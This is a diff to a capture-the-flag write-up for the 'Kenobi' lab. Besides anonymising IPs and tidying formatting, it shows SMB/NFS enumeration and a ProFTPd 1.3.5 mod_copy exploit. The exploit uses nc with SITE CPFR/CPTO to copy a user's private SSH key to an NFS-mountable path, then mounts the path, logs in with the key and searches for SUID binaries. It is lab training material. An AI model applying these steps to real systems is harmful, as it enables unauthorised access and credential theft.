@@ -80,7 +80,7 @@ Samba share enum:
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:47 BST
-Nmap scan report for 10.10.11.75
+Nmap scan report for <ip>
 Host is up (0.57s latency).
 
 PORT    STATE SERVICE
@@ -89,7 +89,7 @@ PORT    STATE SERVICE
 Host script results:
 | smb-enum-shares: 
 |   account_used: guest
-|   \\10.10.11.75\IPC$: 
+|   \\<ip>\IPC$: 
 |     Type: STYPE_IPC_HIDDEN
 |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
 |     Users: 1
@@ -97,7 +97,7 @@ Host script results:
 |     Path: C:\tmp
 |     Anonymous access: READ/WRITE
 |     Current user access: READ/WRITE
-|   \\10.10.11.75\anonymous: 
+|   \\<ip>\anonymous: 
 |     Type: STYPE_DISKTREE
 |     Comment: 
 |     Users: 0
@@ -105,7 +105,7 @@ Host script results:
 |     Path: C:\home\kenobi\share
 |     Anonymous access: READ/WRITE
 |     Current user access: READ/WRITE
-|   \\10.10.11.75\print$: 
+|   \\<ip>\print$: 
 |     Type: STYPE_DISKTREE
 |     Comment: Printer Drivers
 |     Users: 0
@@ -119,7 +119,7 @@ nfs scan:
 ```bash
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
 ```
-Shows /var can be mounted via nfs.
+Shows `/var` can be mounted via nfs.
 
 #### Samba
 Connect:
@@ -146,7 +146,7 @@ ProFTPd 1.3.5 - File Copy                                                     | 
 
 searchsploit -p linux/remote/36742.txt
 ```
-linux/remote/36742.txt shows an example of using nc and ProFTPd 1.3.5 to copy files.
+`linux/remote/36742.txt` shows an example of using nc and ProFTPd 1.3.5 to copy files to different locations on the system.
 
 ### Exploitation
 
@@ -154,8 +154,8 @@ linux/remote/36742.txt shows an example of using nc and ProFTPd 1.3.5 to copy fi
 We know the location of the ssh key from `log.txt` and a nfs location of `/var`.
 
 ```bash
-nc 10.10.11.75 21                        
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.11.75]
+nc <ip> 21                        
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [<ip>]
 
 SITE CPFR /home/kenobi/.ssh/id_rsa 
 350 File or directory exists, ready for destination name
@@ -164,14 +164,14 @@ SITE CPTO /var/tmp/id_rsa
 ```
 
 #### Retrieving key
-```
+```bash
 mkdir /mnt/kenobi
 mount <ip>:/var /mnt/kenobi
 cp /mnt/kenobi/tmp/id_rsa .
 ```
 
 #### Using Key
-```
+```bash
 chmod 600 id_rsa
 ssh -i ./id_rsa kenobi@<ip>
 ```
@@ -180,9 +180,8 @@ and we are in!
 #### Privilege Esculation
 
 #### Searching for root suid binaries
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
-
 ```
 This find typical binaries and files like ping, sudo etc and `/usr/bin/menu`
 
